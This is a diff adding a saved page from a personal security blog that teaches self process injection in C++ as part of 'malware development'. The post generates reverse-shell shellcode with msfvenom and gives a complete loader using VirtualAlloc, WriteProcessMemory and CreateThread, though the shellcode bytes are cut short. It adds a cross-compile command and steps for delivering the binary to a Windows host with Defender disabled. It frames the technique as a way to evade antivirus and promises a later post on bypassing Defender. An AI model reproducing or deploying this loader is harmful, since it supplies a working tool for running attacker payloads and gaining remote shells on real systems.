@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<!-- saved from url=(0075)http://localhost:8000/content.html?p=md/Self-Proccess-Injection-With-CPP.md -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Self Proccess Injection With CPP</title>
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Self Proccess Injection With CPP">
+    <meta property="og:description" content="Self process injection occurs when a program loads or executes a malicious payload in its own address space (rather than writing to or running the payload in another process). This technique is often used to avoid dropping files to disk, alter the runtime execution flow, or dynamically load modules/payloads during execution.">
+    <meta property="og:site_name" content="0xc4t Notes">
+    <meta property="og:image" content="">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="icon" type="image/x-icon" href="https://pbs.twimg.com/profile_images/1960719102932344837/T8Sl7V0i_400x400.jpg">
+
+  </head>
+  <body>
+    <h1>0xc4t Notes</h1>
+    <p class="slogan">
+      <i>Web Security &amp; Active Directory Security</i>
+    </p>
+    <nav>
+      <a href="http://localhost:8000/index.html">Posts</a>
+    </nav>
+    <hr>
+    <h3>Self Proccess Injection With CPP</h3>
+    <div id="content" class="content"><p>Ideally, I am very interested in malware development, so in this article I want to try writing about Process Injection, one topic within malware development. This article is only a note of what I learned—sorry in advance if it is misleading or out of context.</p>
+<p>In this article I only discuss self process injection (not yet remote process injection).</p>
+<h3>What is Proccess Injection</h3>
+<p>Process injection is a technique where an attacker runs malicious code inside the address space of a running process—usually a legitimate or normal process. Why is this technique used? Because it can evade AV detection (Windows Defender), since it doesn't always write code to disk; it is often performed entirely in memory.</p>
+<h3>Self Process Injection</h3>
+<p>Self process injection occurs when a program loads or executes a malicious payload in its own address space (rather than writing to or running the payload in another process). This technique is often used to avoid dropping files to disk, alter the runtime execution flow, or dynamically load modules/payloads during execution.</p>
+<h3>Steps</h3>
+<ol>
+<li>Create the shellcode (can use msfvenom or other C2)</li>
+<li>Obtain the target process.</li>
+<li>Allocate memory for the shellcode.</li>
+<li>Write the shellcode into the previously allocated memory.</li>
+<li>Execute the shellcode using a thread.</li>
+</ol>
+<h3>Windows API</h3>
+<ul>
+<li>VirtualAlloc() <a href="https://learn.microsoft.com/id-id/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://learn.microsoft.com/id-id/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</a></li>
+<li>WriteProcessMemory() <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</a></li>
+<li>GetCurrentProcess() <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess</a></li>
+<li>CreateThread() <a href="https://learn.microsoft.com/id-id/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">https://learn.microsoft.com/id-id/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</a></li>
+</ul>
+<h3>Sourcode Overview</h3>
+<ol>
+<li>First, create the shellcode using Metasploit (msfvenom). Here I'm using a simple shellcode for a reverse shell.</li>
+<img src="Pasted image 20251109193744.png">
+<li>Create our program — I'll name it <code>main.cpp</code> — then put the following code into it.</li>
+</ol>
+<img src="Pasted image 20251109194020.png">
+<ol start="3">
+<li>Use the <code>VirtualAlloc</code> function to allocate memory for the shellcode.</li>
+</ol>
+<pre><code class="language-cpp">auto hMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+</code></pre>
+<ol start="4">
+<li>
+<p>Create two variables: a <code>SIZE_T</code> for <code>byteWritten</code> and a <code>HANDLE</code> for <code>hProcess</code>, which you initialize with <code>GetCurrentProcess()</code></p>
+<img src="Pasted image 20251109194429.png">
+</li>
+<li>
+<p>With <code>WriteProcessMemory()</code> write the shellcode into the memory space you allocated earlier.</p>
+</li>
+</ol>
+<img src="Pasted image 20251109194530.png">
+<ol start="6">
+<li>
+<p>Create one <code>DWORD</code> variable — name it whatever you like; I use <code>threadId</code> — and set its value to <code>0</code>. This serves as an identifier but is not strictly required.</p>
+</li>
+<li>
+<p>Execute the shellcode by creating a thread with <code>CreateThread()</code>, wait for the thread to finish using <code>WaitForSingleObject()</code>, then free resources with <code>CloseHandle()</code>.</p>
+</li>
+</ol>
+<img src="Pasted image 20251109195006.png">
+<h3>Fullcode</h3>
+<pre><code class="language-cpp">#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+
+int main(){
+    unsigned char shellcode[]{
+        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
+        "\x52\x51...};
+
+        auto hMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+        SIZE_T byteWritten = 0;
+        HANDLE hProccess = GetCurrentProcess();
+
+        WriteProcessMemory(
+            hProccess,
+            hMemory,
+            shellcode,
+            sizeof(shellcode),
+            &amp;byteWritten
+        );
+
+        DWORD threadId = 0;
+        auto hThread = CreateThread(
+            NULL,
+            0,
+            (LPTHREAD_START_ROUTINE)hMemory,
+            NULL,
+            0,
+            &amp;threadId
+        );
+
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+
+}
+
+</code></pre>
+<h3>Cross Compile Code From Linux</h3>
+<pre><code class="language-bash">x86_64-w64-mingw32-g++ -o classic.exe classic.cpp -static
+</code></pre>
+<img src="Pasted image 20251109195331.png">
+<h3>Set Listener and running payload in Windows</h3>
+<img src="Pasted image 20251109195429.png">
+<p>Transfer the binary file <code>classic.exe</code> using Python 3, and simply download <code>binary.exe</code> using the built-in <code>iwr</code> (Invoke-WebRequest) in Windows PowerShell.</p>
+<img src="Pasted image 20251109200417.png">
+<p>I run the binary on Windows 11 with the AV (Windows Defender) turned off. Maybe next time we'll discuss how to bypass Windows Defender using process injection techniques.</p>
+<h3>Reference</h3>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1055/">https://attack.mitre.org/techniques/T1055/</a></li>
+<li><a href="https://adrianjnkns.medium.com/shellcode-injection-process-6664d9ec928e">https://adrianjnkns.medium.com/shellcode-injection-process-6664d9ec928e</a></li>
+</ul>
+</div>
+    <div class="social-icons">
+      <a href="https://www.instagram.com/0xc4t?utm_source=ig_web_button_share_sheet&amp;igsh=ZDNlZDc0MzIxNw==" target="_blank"><i class="fab fa-instagram"></i></a>
+      <a href="https://x.com/iamvarel" target="_blank"><i class="fab fa-x-twitter"></i></a>
+    </div>
+    <div class="footer">
+      © 2025 0xc4t
+    </div>
+
+
+</body></html>
